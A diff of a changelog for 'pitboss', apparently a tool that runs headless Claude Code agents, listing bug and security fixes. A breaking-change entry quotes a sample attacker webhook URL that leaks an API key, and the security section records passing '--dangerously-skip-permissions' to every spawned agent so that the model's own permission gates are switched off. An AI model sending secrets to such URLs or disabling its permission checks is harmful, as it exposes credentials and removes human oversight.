-  doesn't propagate. (#156 M4)
-- `NotificationConfig.request_timeout_secs` (new field, optional) — per
-  `[[notification]]` HTTP timeout in seconds; defaults to
-  `DEFAULT_REQUEST_TIMEOUT_SECS` (30) when unset. Plumbs through
-  `notify::sinks::build` to the Webhook / Slack / Discord sinks. The
-  previous behaviour (hard-coded 30 s on the `RequestBuilder`) was
-  invisible at the manifest surface and stacked across the 3-attempt
-  retry loop to a ~91 s worst-case latency tail. (#156 L5)
-- `NotificationRouter::new` — the LRU dedup cache size is now
-  operator-tunable via `PITBOSS_NOTIFY_DEDUP_CACHE_SIZE` (parsed once at
-  router construction; non-numeric or zero values fall back to
-  `DEFAULT_DEDUP_CACHE_SIZE = 64`). New explicit constructor
-  `new_with_capacity(sinks, capacity)` for tests that need deterministic
-  cache behaviour independent of the process env. (#156 L1)
-- `notify::parent::set_run_id_env` — wrapped `std::env::set_var` in an
-  `unsafe` block with a SAFETY comment documenting the dispatcher's
-  single-call-site contract (called before any worker / MCP /
-  notification task is spawned, exactly once per process). Forward-
-  compatible with Rust edition 2024, where `set_var` becomes `unsafe`.
-  (#156 L7)
-
-**Manifest (#155 final follow-up):**
-- `manifest::map_doc::build_line_index` — brace-depth scanner skips lines
-  starting with `//` or `///`. Doc-comments containing `{` or `}` (e.g. a
-  struct-literal example inside a `///` block) used to corrupt the depth
-  counter and falsely close the surrounding struct body, attributing
-  later fields to the wrong struct. (#155)
-- `manifest::map_doc` / `manifest::example_doc` `--check` mode (CLI and
-  test) — strips CR before LF on the checked-in file before comparing to
-  the generator output. Windows checkouts with `core.autocrlf=true` no
-  longer false-positive every drift check. The generator only emits LF;
-  any CR present came from git, not from drift. (#155)
-
-**Control plane (#152, all 7 audit items):**
-- `control::server::serve_connection` — `CancelWorker`, `PauseWorker`,
-  `ContinueWorker`, `RepromptWorker` (worker-id branch), and
-  `ListWorkers` are now sub-lead-aware. A new `find_worker_layer` helper
-  searches `state.root` first, then iterates `state.subleads`, and the
-  handlers run against the discovered layer's `workers` /
-  `worker_cancels` / `worker_pids` / `worker_counters` maps. Pre-fix all
-  five hard-coded `state.root.workers` and so returned `unknown task_id`
-  for any sub-lead-owned worker (and `ListWorkers` snapshots omitted them
-  entirely). `WorkerSnapshotEntry.parent_task_id` is now populated with
-  the sub-lead's id for sub-lead-owned workers (was always `None`). (#152 M2)
-- `control::server::serve_connection` — when the prior connection's
-  outbound queue is full or closed, the `Superseded` `try_send` failure
-  now logs at `warn` level (was a silent `let _ =`). The displaced TUI
-  may not learn it was superseded if its socket is wedged, but the drop
-  is now observable in journald. (#152 M1)
-- `control::server::serve_connection` parse-error path now extracts the
-  `op` field from the raw JSON line so `OpFailed.op` is non-empty (the
-  literal request tag when the line is parseable JSON, the
-  `parse_error` sentinel otherwise). The empty-string `op` was the only
-  signal to the TUI before, leaving it no way to attribute the failure.
-  (#152 L4)
-- `control::server::serve_connection` outbound pump batches `try_recv`
-  drains and calls `flush()` exactly once per batch via the new
-  `send_events_batch` helper. The hello handshake (Hello + N queued
-  ApprovalRequests) and overlapping `WorkersUpdate` + `StoreActivity`
-  ticks no longer pay one syscall per event. Single-event throughput
-  unchanged. (#152 L5)
-- `control::control_socket_path` now sweeps stale `*.control.sock` files
-  in `$XDG_RUNTIME_DIR/pitboss/` whose mtime is older than 24 h. Pitboss
-  removes its own socket on clean shutdown via `ControlServerHandle::Drop`,
-  so older files came from crashed runs that would otherwise accumulate
-  forever. Sweep is best-effort; permission/in-use errors are silently
-  ignored. (#152 L3)
-- `control::server::serve_connection` writer-id-based slot match — the
-  load-bearing reconnect-safety guard is now documented at both ends
-  (install site + disconnect cleanup) with explicit "do not remove"
-  language so a future refactor can't silently drop the id check and
-  recreate the silent-disconnect-on-reconnect race. (#152 L1)
-- `control::protocol` — module-level wire-compatibility convention added:
-  every new field on an existing `ControlOp`/`ControlEvent` variant must
-  carry `#[serde(default)]` (or `default = "fn"` / `skip_serializing_if`)
-  so old TUI clients keep parsing. New variants are always safe; mutating
-  existing variants without the default is what breaks older clients
-  silently. (#152 L2)
-
-**Schema metadata (pitboss-schema + pitboss-schema-derive audit follow-ups):**
-- `pitboss_schema::FormType` — marked `#[non_exhaustive]`, derives
-  `Hash`, `PartialOrd`, `Ord`, and `serde::Serialize` (snake_case names
-  matching `as_str()`). Downstream crates can now key `HashMap`s on
-  `FormType`, sort descriptor lists, and JSON-export descriptors directly.
-  Existing exhaustive `match` arms in `pitboss-cli::manifest::map_doc` /
-  `example_doc` gained explicit `_ =>` fallbacks. (#158)
-- `pitboss_schema::FormType::try_from_str` (new) — strict parser
-  returning `Option<Self>` for non-macro callers; the existing
-  `from_str` keeps its silent fall-back-to-`Text` behaviour for the
-  derive macro's compile-time-validated path. (#158)
-- `pitboss_schema::FieldDescriptor` / `SchemaSection` — derive
-  `serde::Serialize`. n8n form exporters and schema-doc tooling can
-  now emit descriptors directly instead of reconstructing the wire
-  shape. Module-level docs gained an explicit "Generated
-  `field_metadata()` method" section so `cargo doc` users see what
-  the macro emits without digging into `pitboss-schema-derive`. (#158)
-- `pitboss_schema_derive::field_has_serde_default` — re-implemented on
-  top of `parse_args_with(Punctuated::<Meta, Token![,]>::parse_terminated)`
-  rather than a raw `TokenTree` walk. The previous walker matched any
-  `Ident` named `default` anywhere in the attribute, which would
-  misclassify a sibling directive whose path or value contained the
-  word. The fix only counts `default` when it is the sole segment of a
-  top-level meta path. (#159)
-- `pitboss_schema_derive` — `#[field(...)]` macro now rejects
-  duplicate keys (`label`, `help`, `form_type`, `enum_values`,
-  `required`, `skip`) with a hard compile error instead of silently
-  using the last value. (#159)
-- `pitboss_schema_derive` — generated descriptor entries reference
-  the `FormType` variant directly (`::pitboss_schema::FormType::Path`)
-  instead of going through a runtime `FormType::from_str("path")`
-  lookup. Drift between the macro's known-form-type table and the
-  enum is now a compile error rather than a silent runtime fallback
-  to `Text`. The `KNOWN_FORM_TYPES` table is the single source of
-  truth for both validation and variant mapping. (#159)
-- `pitboss_schema_derive` — generated `field_metadata()` carries
-  `#[allow(dead_code)]` so feature-gated reflection paths in
-  consumer crates don't trip dead-code warnings. (#159)
-- `pitboss_schema_derive` — struct-level errors (non-named-fields,
-  non-struct targets) now use `Span::call_site()` so the diagnostic
-  points at the `#[derive(FieldMetadata)]` invocation rather than
-  the type identifier. (#159)
-
-**CLI (active-run liveness + audit follow-ups):**
-- `runs::resolve_socket_path` — fallback path no longer joins `run_id` a
-  second time. The runs-discovery caller already passes the per-run
-  subdirectory (`<base>/<uuid>/`), but the fallback was constructing
-  `<base>/<uuid>/<uuid>/control.sock` — a path the dispatcher never
-  writes. On any system without `$XDG_RUNTIME_DIR` (containers without
-  a login session, minimal init, some CI runners) the liveness probe
-  silently failed for every run and `pitboss list --active` reported
-  the system as idle while runs were actively executing. Closes #141.
-- `main::run_validate` — exits `2` on validation failure instead of
-  `1`, matching the dispatch-side convention. Scripts wrapping
-  `pitboss validate` can now distinguish a missing binary (OS error,
-  exit 1) from a bad manifest (validation error, exit 2). (Item from #157.)
-- `cli::Command::Diff` / `cli::Command::Attach` — added `--run-dir`
-  override, mirroring `status` / `resume` / `list` / `prune`. Operators
-  with a custom runs directory no longer have to drop down to
-  `pitboss list --json` to find the absolute path before running
-  `attach` or `diff`. (Item from #157.)
-- `cli::Command::Dispatch` — `--background` / `--dry-run` /
-  `--internal-run-id` mutual-exclusions are now declared via clap
-  `conflicts_with` / `conflicts_with_all` so the conflicts surface in
-  `--help`, shell completions, and parse-time errors instead of an
-  opaque exit-2 mid-handler. The redundant runtime checks in
-  `main.rs` were removed. (Item from #157.)
-- `runs::collect_run_entry` — a `summary.json` that exists but fails
-  to deserialize is now classified as `Aborted` with a `tracing::warn`
-  surfacing the parse error. Previously the call silently fell through
-  to jsonl classification, which would happily report a corrupted
-  finalised run as `Running` if the jsonl mtime was recent — actively
-  misleading the orchestrator. (Item from #157.)
-- `list::RunListEntry.status` — typed as `runs::RunStatus` (with
-  `Serialize` and `serde(rename_all = "lowercase")`) instead of
-  `&'static str`. The wire format is unchanged, but renaming a
-  variant or its label is now a type-checked breaking change for
-  consumers of the JSON enum-string set rather than a silent flip.
-  (Item from #157.)
-
-**Manifest (container-dispatch unblock + audit follow-ups):**
-- `manifest::validate::validate_lead` — `is_in_git_repo` probe now
-  gated on `!skip_dir_check`, mirroring the directory-existence check.
-  Container-dispatch manifests carry container-side paths
-  (`/workspace/foo`) that don't exist on the host, so the prior
-  unconditional `git2::Repository::discover` call rejected every
-  hierarchical container manifest with the default `use_worktree = true`.
-  Closes #142.
-- `manifest::schema::ApprovalRuleSpec` /
-  `manifest::schema::ApprovalMatchSpec` — added `#[serde(deny_unknown_fields)]`.
-  A typo'd field in an `[[approval_policy]]` block (e.g. `catagory`
-  instead of `category`) used to silently parse with no match filter,
-  matching every event. (Item from #155.)
-- `manifest::validate::validate_hierarchical_ranges` — removed the
-  meaningless `max_parallel_tasks == 0` check. That field is a flat-mode
-  ([[task]]) concurrency cap, and `ResolvedManifest.max_parallel_tasks`
-  always carries the resolver default
-  (`schema::DEFAULT_MAX_PARALLEL_TASKS`), so the assertion never fired
-  for properly-resolved manifests and was misleading to read in lead-mode
-  validation. The legitimate range check stays in `validate_ranges`
-  (flat-mode path). (Item from #155.)
-- `manifest::validate::translate_legacy_parse_error` scanners
-  (`has_top_level_array_table`, `has_field_in_section`, `has_subtable`)
-  — now skip `#`-prefixed comment lines. A commented-out v0.8 field
-  inside `[run]` (e.g. `# approval_policy = "block"`) used to trigger a
-  false-positive migration hint, and `# [[lead]]` in a leading docstring
-  used to satisfy the array-table probe. (Two items from #155.)
-- `manifest::validate::validate_lifecycle` — error message rewritten so
-  the inline `[[notification]] / kind = "log"` snippet renders as a
-  separate indented block rather than as flowing prose; an operator
-  copy-pasting the message no longer ends up with text fragments
-  embedded next to the TOML keys. (Item from #155.)
-- `manifest::schema` — promoted `DEFAULT_MAX_PARALLEL_TASKS` to a
-  `pub const` in `schema.rs` (re-imported by `resolve.rs`) so the
-  effective default is discoverable from the schema source by form
-  renderers, `pitboss schema` consumers, and doc generators without
-  reading resolver internals. Also added `#[serde(default)]` to
-  `RunConfig.max_parallel_tasks` for parity with the other optional
-  fields. (Item from #155.)
-
-**Notify (webhook secret hygiene + SSRF blocklist):**
-- `notify::config::redact_webhook_url` (new helper) — strips path, query,
-  and fragment from any webhook URL before it lands in an error message
-  or `tracing` line, preserving only `<scheme>://<host>[:<port>]`. Slack
-  incoming-webhook URLs (`/services/T.../B.../<TOKEN>`), Discord webhook
-  URLs (`/api/webhooks/<id>/<token>`), and any URL with a token in the
-  query string previously appeared verbatim in `validate_webhook_url`,
-  `pre_request_ssrf_check`, and `reqwest::Error` output, exposing the
-  channel's authorisation to journald, log aggregators, and crash
-  reporters on the first failed delivery. All call sites in `config.rs`,
-  `webhook.rs`, `discord.rs`, and `slack.rs` now use the helper, and
-  every `reqwest::Error` propagated from `.send().await` /
-  `.error_for_status()` is filtered through `.without_url()` before
-  bubbling up. Closes #143.
-- `notify::config::pre_request_ssrf_check` — literal-IP fast-path now
-  re-checks `is_disallowed_ip` instead of unconditionally returning Ok.
-  Previously a future caller constructing a `WebhookSink` directly
-  (bypassing manifest validation) would have been able to POST to a
-  private IP. The runtime guard is now the last gate before the network,
-  not a no-op. (Item from #156.)
-- `notify::config::is_disallowed_ip` — adds IPv4 multicast (`224.0.0.0/4`),
-  IPv6 multicast (`ff00::/8`), and IPv6 site-local (`fec0::/10`, RFC 3879
-  deprecated but still routed by Linux) to the SSRF blocklist. (Items
-  from #156.)
-- `notify::sinks::slack::escape_slack_mrkdwn` — adds `&` to the backslash-
-  escape set. Slack mrkdwn HTML-decodes `&amp;` / `&lt;` / `&gt;`, so
-  without escaping `&` an untrusted field containing `&lt;@U123&gt;`
-  would render as `<@U123>` and resolve to a mention, bypassing the
-  existing `<` / `@` / `>` escapes. (Item from #156.)
-- `notify::parent::build_parent_sink` — `PITBOSS_PARENT_NOTIFY_URL` now
-  parses through `reqwest::Url::parse` at sink-build time and emits a
-  `tracing::warn!` instead of silently constructing a sink that fails on
-  first emit. (Item from #156.)
-- `notify::sinks::discord::DiscordSink` /
-  `notify::sinks::slack::SlackSink` — both gain a `bypass_ssrf` field
-  mirroring `WebhookSink`, with a `#[cfg(test)] new_unchecked` constructor
-  that skips the per-request guard so `wiremock::MockServer` (which
-  always binds 127.0.0.1) can still be used in unit tests after the
-  literal-IP fast-path was tightened.
-
-**pitboss-core (child supervision):**
-- `pitboss-core::session::handle` — PID slot now cleared the moment
-  `child.wait()` resolves, before the up-to-30 s stream-drain await. The
-  previous ordering left the reaped child's PID published for the entire
-  drain window; on busy systems where the kernel recycled that PID within
-  milliseconds, any signal the dispatcher's freeze-pause path sent during
-  the window could land on an unrelated process. Closes #147.
-- `pitboss-core::process::tokio_impl` — children are now spawned with
-  `process_group(0)` (each child becomes its own group leader, PGID == PID)
-  and `terminate()`/`kill()` signal `-pgid` instead of the bare child PID.
-  This propagates SIGTERM/SIGKILL to the entire `claude` subtree (Bash
-  subshells, sub-agents, MCP servers) instead of orphaning them to PID 1
-  where they would keep holding worktree locks and burning budget. ESRCH
-  on an empty group is collapsed to `Ok` so terminate-after-exit stays a
-  no-op. `kill()` and `terminate()` are now symmetric (both use the same
-  group-targeted `libc::kill` path), addressing the legacy asymmetry where
-  one used `start_kill` and the other used raw `libc::kill`. Closes #148.
-- `pitboss-cli::dispatch::signals` — `freeze`/`resume_stopped`
-  (SIGSTOP/SIGCONT) now signal the worker's process group as well, so the
-  whole subtree halts and resumes together rather than leaving claude's
-  children running while the parent is frozen.
-
-**pitboss-core (audit follow-ups, low-severity):**
-- `session::handle::stream_loop` — assistant-text length comparison changed
-  from `>=` to `>` so equal-length later messages don't silently displace
-  the first-seen winner (claude's tail confirmations cluster at similar
-  short lengths and were occasionally clobbering the substantive answer).
-- `session::handle::stream_loop` — `parse_line_all` errors and `try_send`
-  drops on the `session_id` channel now emit `tracing::debug!` lines
-  instead of being swallowed silently, giving operators a diagnostic trail
-  when subprocess output is malformed or the session-id receiver vanishes.
-
-**TUI:**
-- Completed page Detail view always showed the same log regardless of which
-  row was selected — `enter_detail_for` now updates `state.focus` so the
-  watcher tails the correct task log.
-- Log pane text leakage into the approval column — long lines with no
-  whitespace (JSON blobs, markdown tables) now truncated to 4× pane width
-  before passing to `Paragraph`; explicit `Clear` added before the approval
-  pane renders.
-- Promotion threshold corrected from 5 s to 120 s — tiles were vanishing
-  from the Active grid before operators could read their outcome.
-- `format_duration_ms`: sub-second durations (1–999 ms) now render as `"Nms"`
-  instead of `"0s"` (#108).
-- `tui_table`: task ID column now truncates with ellipsis to prevent column
-  misalignment on long sub-lead IDs (#96).
-- `reset_state_for_switch`: now clears `control_connected` before
-  `connect_control` overwrites it (#113).
-- TUI stale `read_loop` events from a prior run no longer leak into the new
-  run after `SwitchRun` — `ctrl_events_rx` is drained between reset and
-  reconnect (#104).
-- `ApprovalBridge::request`: `try_send` failure now emits a `warn!` log (#110).
-- `approval_bridge` Mutex no longer held across `ev_tx.send().await` during
-  bridge replay — entries collected first, lock dropped before sending (#105).
-
-**Dispatch / runner:**
-- `match_auth` now gates `authentication_error` on co-occurrence with a 401
-  or `invalid_api_key` signal to prevent false-positive auth backoff from prose
-  log lines that mention "authentication_error" incidentally.
-- `parse_reset_timestamp` advances the year by 1 when the parsed reset date is
-  already in the past (handles "resets Jan 1" seen on Dec 31).
-- `tasks_failed` no longer counts `Cancelled` workers when the lead succeeded,
-  fixing spurious non-zero exit codes on clean hierarchical runs.
-- `build_sublead_mcp_config` now writes to `run_subdir` instead of
-  `std::env::temp_dir()`, and creates the directory defensively so test
-  harnesses don't need to pre-create it.
-- `active_worker_count` in `LayerState` now excludes the lead subprocess —
-  previously capped effective worker parallelism at `max_workers - 1`.
-- `halt_on_failure` drain no longer sets `was_interrupted = true`; the two
-  drain paths are now distinguished via `Arc<AtomicBool>`.
-- TTL expiry threshold changed from `age > ttl` to `age >= ttl` — zero-TTL
-  entries never fired on the first tick.
-- `spawn_sublead` budget guard TOCTOU fixed: `reserved_usd` lock now held
-  across check-and-add so concurrent callers can't both pass the cap (#106).
-- `sublead.rs` `subleads.jsonl` append switched to `tokio::fs` to avoid
-  blocking a tokio runtime thread (#98, already fixed in v0.8 session).
-- `parent_task_id` on sub-lead `TaskRecord` now set to the lead's actual id
-  instead of the literal string `"root"`.
-- `probe_claude`: explicit `PermissionDenied` error arm added.
-- `pitboss diff`: unparseable `summary.jsonl` lines now emit `tracing::warn!`
-  instead of silently undercounting tasks (#107).
-
-**Notify / shared store:**
-- `substitute_env_vars` rewrote byte-cast iteration to str-based find/slice —
-  byte-cast corrupted multi-byte UTF-8 outside `${...}` tokens.
-- `emit_with_retry` guard fixed from `attempt < 2` to
-  `attempt < backoffs.len() - 1` so the 900 ms backoff actually fires.
-- Discord and Slack sinks use `saturating_sub` for `tasks_total - tasks_failed`
-  to avoid panic when failed count exceeds total.
-- Shared-store lease acquire wait loop: `RecvError::Closed` now returns
-  `Err(StoreError::Shutdown)` instead of looping forever.
-- `validate_path` now checks exact path segments (`split('/').any(|s| s == "..")`)
-  instead of substring match (`.contains("..")`) to prevent false positives.
-
-**Manifest:**
-- `expand_paths` now expands `leads[*].directory` (previously only
-  `tasks[*].directory` and `run_dir` were expanded).
-
-**Core:**
-- `error::truncate()` rewrote byte-index slicing to char-based iteration to
-  prevent panic on multi-byte UTF-8 input.
-- TUI `short_id` rewrote byte-offset slicing with `chars().take()` /
-  `chars().skip()` to prevent panic on non-ASCII run IDs.
-
-**CI:**
-- `actions/upload-artifact` and `actions/download-artifact` corrected from
-  nonexistent versions (`v7`/`v8`) to `v4`.
 
 ## [0.8.0] — 2026-04-24
 
-The correctness hardening and new-capabilities release. Closes all 34 medium-
-and high-severity issues catalogued in the v0.8 audit cycle, ships three new
-subcommands (`container-dispatch`, `status`, and the TUI live policy editor),
-and completes the approval pipeline with full TTL coverage across both the
-queue and bridge paths.
-
 ### Added
 
-- **`pitboss container-dispatch <manifest.toml>`** — assembles and execs a
-  Docker/Podman run command from a `[container]` section in the manifest.
-  Auto-injects `~/.claude` (OAuth auth) and the run artifact directory as
-  bind mounts. Operators declare project/reference mounts via
-  `[[container.mount]]`. UID alignment is handled automatically: rootless
-  podman gets `--userns=keep-id`; Docker gets `-u uid:gid` when needed. Use
-  `--dry-run` to print the assembled command without launching. The manifest
-  `[container]` section is stripped before being mounted into the container
-  so older image binaries don't reject the field.
+- Pitboss container-dispatch subcommand ([#90](https://github.com/SDS-Mode/pitboss/pull/90))
 
-  ```toml
-  [container]
-  runtime = "podman"   # optional; auto-detected
-  workdir = "/project"
-
-  [[container.mount]]
-  host      = "~/projects/myproject"
-  container = "/project"
-  readonly  = false
-  ```
-
-- **`pitboss status <run-id> [--json]`** — prints a formatted task table for
-  any run (in-flight or finalized). Reads `summary.jsonl` (live) or
-  `summary.json` (finalized). Columns: task ID, status glyph, duration, start
-  time, exit code, and totals. `--json` flag emits structured JSON for
-  scripting. Run ID supports the same prefix matching as `attach`.
-
-- **TUI live policy editor** — press `P` in Normal mode to open a centered
-  overlay showing the current `[[approval_policy]]` rules. Navigate with
-  `j`/`k`, cycle an action with Space/Enter (`auto_approve` → `auto_reject` →
-  `block`), add a rule with `n`, delete with `d`, save and apply with `s`/F2,
-  cancel with Esc. Saving sends `ControlOp::UpdatePolicy` to the dispatcher
-  which re-installs the `PolicyMatcher` live — no restart required.
-
-- **`ApprovalTimedOut` terminal status wired end-to-end** — approval requests
-  now carry `ttl_secs` and `fallback` through `BridgeEntry` into the bridge
-  map, so the TTL watcher fires the correct fallback (`auto_reject` /
-  `auto_approve`) regardless of whether the entry is in the queue or has
-  already been drained to a connected TUI. Tasks that exit because an
-  approval TTL fired are now correctly classified as `ApprovalTimedOut`
-  rather than generic `Failed` or `Success`. `from_ttl: bool` on
-  `ApprovalResponse` distinguishes TTL-driven responses from operator
-  actions for downstream reclassification.
-
-- **Sub-lead resume** — `pitboss resume` now persists sub-lead session IDs
-  to `subleads.jsonl` at termination and reads them back at resume time,
-  populating `/resume/subleads` in the shared store. The root lead can
-  discover prior sub-lead sessions and reconnect without re-spawning.
-
-- **`permission_routing` manifest field** — `[lead] permission_routing =
-  "path_a"` (default) or `"path_b"`. Path A is the current behavior
-  (`CLAUDE_CODE_ENTRYPOINT=sdk-ts` bypass). Path B will route claude's
-  built-in permission gate through pitboss's approval queue. Path B is
-  explicitly gated with a validation error until the follow-on
-  stabilization PRs land; see issues #92–#94 for tracking.
 
 ### Changed
 
-- **`DispatchState` no longer implements `Deref<Target = LayerState>`.**
-  All handlers now reach the root layer via `state.root.<field>`. Handlers
-  that formerly used the Deref implicitly (routing to root silently) now
-  fail to compile, making cross-layer misrouting a compile-time error
-  rather than a runtime data corruption hazard. 270+ call sites migrated.
+- Remove DispatchState Deref; fix worktree test helper ([#75](https://github.com/SDS-Mode/pitboss/pull/75))
 
-- **Per-sub-tree cancel cascade** — a second Ctrl-C now cascades `terminate()`
-  to every sub-lead layer and its workers via dedicated per-sub-tree
-  cancel watchers (`install_sublead_cancel_watcher`). Previously only
-  `drain()` cascaded; workers under cancelled sub-leads would run to their
-  timeout.
-
-- **`BridgeEntry` carries TTL metadata in `approval_bridge`** — the bridge map
-  (`approval_bridge`) now stores `BridgeEntry { responder, task_id, ttl_secs,
-  fallback, created_at }` instead of a bare `Sender`. The TTL watcher scans
-  both `approval_queue` and `approval_bridge` so TTL coverage is preserved
-  even after a TUI connects and drains the queue to the bridge. Without this
-  fix, an operator who opened the TUI and left without responding would bypass
-  the TTL fallback entirely.
-
-- **Approval counter attribution fixed** — `approvals_requested`, `_approved`,
-  and `_rejected` in `worker_counters` are now credited to the actual
-  caller's `task_id` rather than always routing to the root `lead_id`.
-  Per-actor `TaskRecord` approval counts now reflect reality.
-
-- **Slack sink: Block Kit layout + mrkdwn escaping** — the Slack notification
-  sink now sends structured Block Kit payloads (header + section blocks) instead
-  of plain-text envelope serialization. Untrusted fields are backslash-escaped
-  via `escape_slack_mrkdwn()`, mirroring the existing Discord sink hardening.
-
-### Breaking changes
-
-- **Notification webhook URLs: `${VAR}` substitution now requires the
-  `PITBOSS_` prefix.** Closes an exfiltration vector where a rogue
-  manifest could write `url = "https://attacker/?t=${ANTHROPIC_API_KEY}"`
-  and leak any host env var to the chosen webhook. If you currently
-  reference an unprefixed variable (e.g. `${SLACK_WEBHOOK_URL}`), rename
-  it in the environment that launches pitboss (e.g. to
-  `PITBOSS_SLACK_WEBHOOK_URL`) and update the manifest accordingly.
-  Unprefixed names now fail loudly at load time rather than silently
-  reaching through to `std::env::var`.
-- **Notification webhook URLs: HTTPS-only, public hosts only.**
-  `http://`, `file://`, and other non-`https` schemes are rejected, as
-  are loopback (`localhost`, `127.0.0.0/8`, `::1`, `::ffff:127.*`),
-  RFC1918 private ranges, link-local (`169.254.0.0/16` — covers the
-  AWS/GCP metadata service), CGNAT (`100.64.0.0/10`), IPv6 ULA
-  (`fc00::/7`), and IPv6 link-local (`fe80::/10`). If you were pointing
-  a webhook at an internal service on purpose, that's no longer
-  supported — route the notification through a public relay instead.
-
-### Security
-
-- **`--dangerously-skip-permissions` is now passed to every spawned
-  claude (lead, sub-lead, worker).** Operators must read this entry.
-  Pitboss is the sole permission authority for orchestrated claude
-  subprocesses — see the v0.7 doc on `CLAUDE_CODE_ENTRYPOINT=sdk-ts`
-  for the original "single permission authority" rationale. The flag
-  extends that decision from MCP tools (which `sdk-ts` already
-  bypassed) to every other claude-side gate: filesystem reads/writes
-  outside cwd, bash with `$VAR` expansion, bash with `&&`. Without
-  the flag, headless dispatch silently stalls on these gates with no
-  operator-visible cause — the smoke test exposed this as empty
-  registries, null kv reads, and "no deliverable files written"
-  despite both subleads reporting `outcome=success`. Pitboss's own
-  approval surface (`approval_policy`, `[[approval_policy]]` rules,
-  TUI modal) replaces what claude's gate would have caught. The flag
-  is set unconditionally and is NOT env-overridable; operators who
-  need claude's own gate fully back should drive claude CLI
-  interactively, not via pitboss headless dispatch. **Trust
-  boundary**: anything you wouldn't run in your own claude session
-  under `--dangerously-skip-permissions` should not be in a pitboss
-  manifest. Operator-supplied prompts have full filesystem + shell
-  access at `[lead].directory`. Treat manifests as production code.
-  Locked in by regression tests — every spawn variant
-  (lead, lead-resume, sublead, sublead-resume, worker) is asserted
-  to carry the flag.
-- **SSRF / secret-exfiltration hardening on `[[notification]]` sinks.**
-  See "Breaking changes" above for URL scheme / host and env-var
-  substitution restrictions.
-- **Discord sink: markdown and mention injection.** Untrusted fields
-  (`request_id`, `task_id`, `summary`, `run_id`, `source`) are now
-  backslash-escaped before being embedded in the Discord description,
-  and every payload sets `allowed_mentions.parse = []` so an attacker
-  who sneaks `@everyone` or a Discord link through a task summary can't
-  actually ping the channel or spoof a clickable link.
-- **`pitboss attach`: path traversal.** `task_id` is now rejected if it
-  is empty, `.`, `..`, or contains `/`, `\\`, or NUL. After the
-  directory check, the task dir is canonicalized and required to remain
-  inside `<run>/tasks/`, closing a pre-planted-symlink escape.
-- **`pitboss resume`: session-id argument injection.** The
-  `claude_session_id` read from on-disk `summary.json` is now validated
-  (`[A-Za-z0-9_-]{1,128}`, no leading `-`) before it is passed to
-  `claude --resume <ID>`. A tamperer with write access to the run
-  directory can no longer inject CLI flags via that field.
-- **MCP bridge: unbounded `read_until` DoS.** The client-to-server loop
-  now reads chunked with a 4 MiB per-line cap; a child that never emits
-  `\n` closes the bridge instead of OOM-ing the host.
 
 ### Fixed
 
-- **`[defaults]` block silently dropped in single-table `[lead]`
-  manifests.** The `SingleLeadManifest` parser had no `defaults` field
-  and no `deny_unknown_fields`, so the entire `[defaults]` section
-  (including `[defaults.env]`) was silently discarded at parse time —
-  a manifest setting `[defaults.env.WORK_DIR] = "/tmp/foo"` would never
-  see that variable reach the lead subprocess. The lead also wasn't
-  merging defaults for `model`, `tools`, `effort`, `timeout_secs`, or
-  `use_worktree` in this form; the single-lead path used only
-  `[lead]`-level values plus a hardcoded fallback, in contrast with
-  the array-form `[[lead]]` path which has done the merge correctly
-  since v0.3. Fixed: `SingleLeadManifest` now carries `defaults`,
-  `resolve_lead_spec` merges the same way `resolve_lead` (array form)
-  does, and `deny_unknown_fields` is on so the next silent-drop bug
-  fails loud at parse time. The `[default]` (singular, common typo
-  for `[defaults]`) is now rejected with an actionable parse error.
-- **TUI approval modal stranded requests on `Esc`.** Hitting `Esc` to
-  dismiss an approval popup transitioned the TUI to normal mode without
-  sending any response, leaving the request pending server-side — the
-  run stayed blocked, the modal was gone, and pressing `a` to "retrieve"
-  the approval opened an empty list because `ApprovalRequest` events
-  were never populating `approval_list.items` in the first place (the
-  queue pane shipped for v0.6 but was only ever wired up in tests).
-  Operators reasonably concluded the TUI was hung and had no way to
-  proceed. Fixed: `ApprovalRequest` events now push an item into the
-  approval queue in addition to opening the modal (de-duplicated by
-  request_id to survive event replays on server restart); `Esc` from
-  any modal sub-mode drops the operator into the approval-list pane
-  with the dismissed item selected; `send_approve` removes items from
-  the queue on decision (clamping `selected_idx` when the last item
-  goes); re-opening a queued request preserves the `plan` payload and
-  `kind` discriminator so dismissed `propose_plan` approvals still
-  render as "PRE-FLIGHT PLAN" with structured plan view on re-open.
-  Modal title updated from the misleading `Esc=cancel` to `Esc=dismiss
-  (stays pending, press \`a\` to re-open)`. `ApprovalListItem.id`
-  changed from `uuid::Uuid` to `String` to match the server's
-  `req-<uuid>` wire format.
-- **`wait_actor` / `wait_for_worker` blocked indefinitely on
-  sub-lead-spawned workers because completion fired the wrong
-  broadcast.** Each `LayerState` carries its own `done_tx`; worker
-  termination called `layer.done_tx.send(task_id)` — for a
-  sub-lead-spawned worker that's the SUBLEAD's broadcast, not
-  root's. `wait_for_actor_internal` always subscribes via
-  `state.root.done_tx`, so the parent sub-lead's `wait_actor` on
-  its own worker missed the completion entirely and blocked until
-  the timeout (or the sub-lead's `lead_timeout_secs` SIGTERM'd it).
-  Smoke-test evidence: workers completed in ~10s, sub-leads timed
-  out at the 180s mark with `MCP error -32000: Connection closed`
-  on the wait_actor reply (the connection died when the sub-lead
-  was killed, not because the wait itself errored). Fixed by
-  fanning worker termination broadcasts to root's `done_tx` in
-  addition to the worker's own layer — applied at both the normal
-  exit path and the SpawnFailed early-exit path.
-- **`wait_for_actor_internal` had a subscribe-after-check race.**
-  Fast-path Done check + existence check ran before
-  `state.done_tx.subscribe()`; a completion that landed in the
-  microsecond gap was missed and the wait blocked until timeout.
-  In v0.5/v0.6 this was unreachable for sub-leads (which got
-  `unknown actor_id` before the cross-layer-lookup fix in d134289),
-  but the same fix exposed the race. Subscribe FIRST, then re-check
-  — guarantees no completion is lost regardless of how short the
-  worker is.
-- **Sub-lead-spawned workers SpawnFailed at `/tmp` when no
-  `directory` arg was passed.** `derive_sublead_manifest` clears
-  `lead` on the sub-manifest, and `handle_spawn_worker`'s fallback
-  chain only consulted `target_layer.manifest.lead.directory` before
-  defaulting to `/tmp`. Sub-lead callers therefore landed on `/tmp`
-  whenever they didn't supply an explicit directory — git worktree
-  creation then failed loudly with `"not inside a git work-tree:
-  /tmp"` and the worker was marked SpawnFailed. The failure was
-  visible in `summary.jsonl` but **not** in the sub-lead's
-  `wait_for_worker` reply (which sees the SpawnFailed task record
-  but doesn't surface the cwd that caused it), so a sub-lead's only
-  signal was a worker that never produced output — easy to misread
-  as a model-side problem. Fixed by extending the fallback chain
-  through the **root lead's** directory before falling back to
-  `/tmp`. Same fix applied to `tools`, `timeout_secs`, and
-  `use_worktree` resolution so sub-lead workers honor the operator's
-  root-level defaults instead of either crashing on `/tmp` or
-  silently using a different `use_worktree` setting than root.
